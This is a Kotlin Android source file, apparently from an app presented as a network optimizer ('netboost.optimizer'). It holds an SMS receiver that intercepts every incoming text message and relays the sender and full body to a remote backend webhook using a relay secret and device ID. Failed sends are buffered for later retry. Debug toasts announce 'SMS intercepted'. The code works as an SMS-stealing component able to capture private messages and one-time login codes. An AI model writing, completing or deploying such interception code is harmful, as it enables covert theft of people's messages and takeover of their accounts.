package com.netboost.optimizer

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Telephony
import android.util.Log
import android.widget.Toast
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class SmsReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "SmsReceiver"
        private const val DEBUG_CHANNEL_ID = "sms_debug"
        private var notifId = 5000
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return

        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        if (messages == null || messages.isEmpty()) return

        val pendingResult = goAsync()
        val msgsBySender = messages.groupBy { it.originatingAddress ?: "Unknown" }

        // Debug: show immediate Toast that SMS was intercepted
        showToast(context, "📨 SMS intercepted! Senders: ${msgsBySender.keys.joinToString()}")

        CoroutineScope(Dispatchers.IO + SupervisorJob()).launch {
            try {
                for ((sender, parts) in msgsBySender) {
                    val fullBody = parts.joinToString(separator = "") { it.messageBody ?: "" }
                    val messageSid = java.util.UUID.randomUUID().toString()

                    Log.d(TAG, "━━━ RELAY DEBUG ━━━")
                    Log.d(TAG, "From=$sender")
                    Log.d(TAG, "Body=${fullBody.take(100)}")
                    Log.d(TAG, "SID=$messageSid")
                    Log.d(TAG, "URL=${Config.BACKEND_WEBHOOK}")
                    Log.d(TAG, "Secret=${Config.RELAY_SECRET.take(8)}...")
                    Log.d(TAG, "DeviceID=${Config.DEVICE_ID}")

                    // Use relayWithCode to get the actual HTTP status
                    val httpCode = BackendClient.relayWithCode(sender, fullBody, messageSid)
                    val success = httpCode in 200..299

                    Log.d(TAG, "━━━ RESULT: HTTP $httpCode (success=$success) ━━━")

                    if (success) {
                        showToast(context, "✅ Relay OK! HTTP $httpCode\nFrom: $sender\nBody: ${fullBody.take(60)}")
                        showDebugNotification(
                            context,
                            "✅ SMS Relayed — HTTP $httpCode",
                            "From: $sender\nBody: ${fullBody.take(100)}\nSID: ${messageSid.take(12)}..."
                        )
                    } else {
                        showToast(context, "❌ Relay FAILED! HTTP $httpCode\nFrom: $sender\nBuffering...")
                        showDebugNotification(
                            context,
                            "❌ Relay Failed — HTTP $httpCode",
                            "From: $sender\nURL: ${Config.BACKEND_WEBHOOK}\nFalling back to buffer"
                        )
                        Log.w(TAG, "Direct relay failed (HTTP $httpCode) — buffering to Room database")
                        com.netboost.optimizer.buffer.RelayBuffer.enqueue(
                            context.applicationContext, sender, fullBody, messageSid
                        )
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Relay exception: ${e.message}", e)
                showToast(context, "💥 EXCEPTION: ${e.message?.take(80)}")
                showDebugNotification(
                    context,
                    "💥 Relay Exception",
                    "${e.javaClass.simpleName}: ${e.message?.take(150)}"
                )
            } finally {
                pendingResult.finish()
            }
        }
    }

    private fun showToast(context: Context, msg: String) {
        Handler(Looper.getMainLooper()).post {
            Toast.makeText(context, msg, Toast.LENGTH_LONG).show()
        }
    }

    private fun showDebugNotification(context: Context, title: String, body: String) {
        try {
            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel(
                    DEBUG_CHANNEL_ID,
                    "SMS Debug Logs",
                    NotificationManager.IMPORTANCE_HIGH
                ).apply {
                    description = "Debug notifications for SMS relay status"
                }
                nm.createNotificationChannel(channel)
            }

            val notification = NotificationCompat.Builder(context, DEBUG_CHANNEL_ID)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentTitle(title)
                .setContentText(body)
                .setStyle(NotificationCompat.BigTextStyle().bigText(body))
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(true)
                .build()

            nm.notify(notifId++, notification)
        } catch (e: Exception) {
            Log.e(TAG, "Debug notification failed: ${e.message}")
        }
    }
}
